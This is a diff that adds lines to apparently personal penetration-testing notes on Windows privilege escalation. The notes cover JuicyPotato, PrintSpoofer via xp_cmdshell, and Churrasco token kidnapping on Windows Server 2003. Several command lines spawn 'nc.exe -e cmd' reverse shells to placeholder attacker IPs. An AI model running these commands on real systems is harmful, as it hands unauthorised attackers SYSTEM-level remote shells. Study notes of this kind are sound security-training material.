@@ -268,6 +268,11 @@ JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onward
 SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <OUR IP> 8443 -e cmd"
 ```
 
+Or we can do it directly in the shell:
+```console
+C:\> .\JuicyPotato.exe -t * -l <PORT> -p C:\Windows\System32\cmd.exe -a "/c C:\<PATH>\nc.exe -e cmd <ATTACKERS IP> <ATTACKERS PORT>"
+```
+
 | **Flag**   | **Description**    |
 |--------------- | --------------- |
 | `-c` | argument to execute a command |
@@ -1404,6 +1409,11 @@ zero@pio$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. [This](https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/) page has a detail list of end-of-life (EOL) for Microsoft Windows. 
 
 ## Windows Server 
+
+For Windows Server 2003 there is a wide range of techniques for privilege escalation. For example, the **Token Kidnapping** with [Churrasco](https://github.com/Re4son/Churrasco). As easy as upload the binary and use it as:
+```console
+C:\Windows\Temp> .\churrasco.exe "<COMMAND AS ADMINISTRATOR>"
+```
 
 Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. Let's first use WMI to check for missing KBs:
 ```console
